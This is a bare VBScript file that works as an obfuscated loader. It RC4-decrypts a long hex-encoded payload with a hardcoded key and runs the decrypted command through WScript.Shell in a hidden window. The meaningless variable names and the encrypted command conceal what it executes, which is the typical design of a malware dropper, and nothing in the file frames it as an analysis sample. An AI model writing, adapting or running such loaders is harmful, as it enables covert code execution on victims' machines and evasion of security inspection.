Function HexToBytes(h)
    Dim s,i,b
    s=""
    For i=1 To Len(h) Step 2
        b=CInt("&H" & Mid(h,i,2))
        s=s & Chr(b)
    Next
    HexToBytes=s
End Function
Function RC4(data,key)
    Dim s(255),i,j,k,t,out,kLen
    kLen=Len(key)
    For i=0 To 255
        s(i)=i
    Next
    j=0
    For i=0 To 255
        j=(j+s(i)+Asc(Mid(key,(i Mod kLen)+1,1))) And 255
        t=s(i)
        s(i)=s(j)
        s(j)=t
    Next
    i=0
    j=0
    out=""
    For k=1 To Len(data)
        i=(i+1) And 255
        j=(j+s(i)) And 255
        t=s(i)
        s(i)=s(j)
        s(j)=t
        out=out & Chr(Asc(Mid(data,k,1)) Xor s((s(i)+s(j)) And 255))
    Next
    RC4=out
End Function
cdr=""
Set okv=CreateObject("WScript.Shell")
kux="65c0fad5d321890402530c36e7a94977"
If Len(kux)>0 Then cdr=RC4(HexToBytes("32e42f273ab8028101aeb1a4bf8bf5596afeb1b4814881f42066589891000d223f074d17b359e005ff6364f25faf4995aec11e446ae6abf7bab3b498d587aa86c3d7ff29854f7d3bdb600ec6160fb2a7a80423246a078e0f5d05de783db144871866c13a4697dbdacebb84e450385f73bb5ff2f975eedb5b9dba5915caa1b6b0078f5b447fa4c75a7e86c4f20bd2ab6a7d2c37757ea80e9c15f274dab266fc6021d5babf5128c59c9ff0412912cca977cb71ec8704c9240d6e58a3864a7fefcc3e9e828046fce0853122a32c3cb3a3950c6584ed7f85b319eedca0cd8a157f1c61b1b90ffa6e884d262d1cc5b4dae5ae3057a4f2940a2b23a3c34e661804bd3f0eb16a70508d64addf625ef5a0ec13c4263376057705d6b70a0a593b388791c228b4f52029870e2cee610518665536f675613dfd426b70e598c6dc959fdcbe8f9530a801039bfd40b3d18c1fa333dc1ee65b14954beddeeaedf7a55ddbfdc9168ae7a7f727a3da68733586efeffc39edf1adfb1a6934296e1510bc7c80ea4e44049ea415fdb74b5a5594d970853d81acd320f2afa675dbe90b6931346a96d222208225e75d3d7724f183b2437ce0f5d75c306eee58c0eb63f6c636f22349574731f8346d33c8df93bf8d8d4579b911d590f6b964815876216871ca13594d6f6e5f2364a012fc5f85f0d355da4d94a6fbb21fda0405b6375463b2a6617330d8996e69f36e8731bf4bb713679a4c56309519ba22ac6cefb57d134abe50d8b982831145dbcc7226bd07c0fa9449bdac785e8b4f0c27613ce6fa936ff7ba1e66a6b1"),kux)
If Len(cdr)>0 Then okv.Run cdr,0

